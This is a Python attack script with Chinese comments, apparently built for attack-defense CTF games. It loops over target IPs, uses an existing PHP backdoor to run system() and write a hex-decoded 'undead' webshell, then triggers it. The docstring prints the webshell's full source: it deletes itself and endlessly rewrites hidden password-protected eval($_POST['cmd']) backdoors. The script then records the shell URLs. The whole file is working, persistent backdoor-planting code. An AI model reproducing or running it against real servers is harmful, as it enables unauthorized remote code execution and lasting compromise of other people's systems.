import requests
from requests.exceptions import ReadTimeout
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from time import sleep


def upload_muma(iplist):
    '''上传16进制编码的不死马，返回木马url'''
    upload_url = []
    with open("url.txt", "w", encoding="utf-8") as f:
        for ip in iplist:
            try:
                url = f"http://{ip}/.a.php?c="
                ##注意检查后面中有没有调用system()和echo()
                ##如果没有要加上完整的不死码应该是
                ## 'system("echo \'\' |xxd -r -ps > /var/www/html/22.php)'
                ##"'system("echo  |xxd -r -ps > /var/www/html/22.php)'"
                # url = url + 'system(echo  |xxd -r -ps > /var/www/html/.nodead.php);'
                url = url + "system('echo  |xxd -r -ps > /app/.nodead.php');"
                # url = url +"system('ls');"
                ''' 不死马内容为  pass=nima
<?php
    ignore_user_abort(true); 
    set_time_limit(0);    
    unlink(__FILE__);  

    $file = '.index2.php'; 
    $code = '<?php if(md5($_POST["pass"])=="db088d7fd61422d0dd9f2152fd550127"){@eval($_POST["cmd"]);} ?>';

    while (1) {
        file_put_contents($file, $code); 
        //system('touch -m -d "2018-01-01 00:00:00" ' . $file); 
        file_put_contents('.config1.php',$code);
        file_put_contents('.app.php',$code);
        file_put_contents('.index.php',$code);
        usleep(5000); 
        }
?>
'''
                requests.get(url=url, timeout=3)
                print(ip + "：植入不死马成功")
                ma1 = f"http://{ip}/.nodead.php"
                requests.get(url=ma1, timeout=5)  # 访问不死马1，循环生成不死马2
                print(ip + "：激活ing")
                ma2 = f"http://{ip}/.index2.php"
                requests.get(url=ma2, timeout=5)  # 激活不死马2
                print(ip + "不死马2激活成功")
                f.write(ma2 + "\n")
                upload_url.append(ma2)  # 保存马2路径

            except ReadTimeout:
                print(url + "不死马访问失败，ReadTimeout")
            except:
                pass
    return upload_url


with open('ip.txt', 'r', encoding='utf-8') as file:
    # 逐行读取
    ip = []
    line = file.readline()
    # 循环直到文件末尾
    while line:
        # 将读取的行添加到列表中，移除行尾的换行符
        ip.append(line.strip())
        # 读取下一行
        line = file.readline()
    upload_muma(ip)
